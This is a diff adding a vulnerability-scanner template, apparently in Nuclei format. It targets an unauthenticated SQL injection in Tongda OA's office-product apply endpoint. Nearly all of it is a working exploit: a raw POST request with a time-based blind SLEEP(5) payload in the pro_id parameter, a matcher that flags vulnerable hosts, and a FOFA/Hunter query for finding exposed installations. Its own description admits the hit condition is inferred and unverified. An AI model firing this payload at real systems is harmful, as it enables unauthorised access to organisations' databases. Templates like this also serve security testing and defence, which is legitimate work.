@@ -1,0 +1,41 @@
+id: poc-389efd324614d8b3f5f0
+info:
+  name: 通达OApro_id存在前台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/389efd324614d8b3f5f0ab2fa4856489
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 389efd324614d8b3f5f0ab2fa4856489
+    fofa: + hunter`app.name="通达 OA"`
+http:
+- raw:
+  - 'POST /general/appbuilder/web/officeproduct/productapply/applyprobygroup HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 39
+
+    X-Requested-With: XMLHttpRequest
+
+    UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.103 Safar
+
+    i/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
+
+    Connection: close
+
+
+    arr[5][pro_id]=151'' AND (SELECT 8770 FROM (SELECT(SLEEP(5)))STfQ) AND ''nbmT''=''nbmT'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
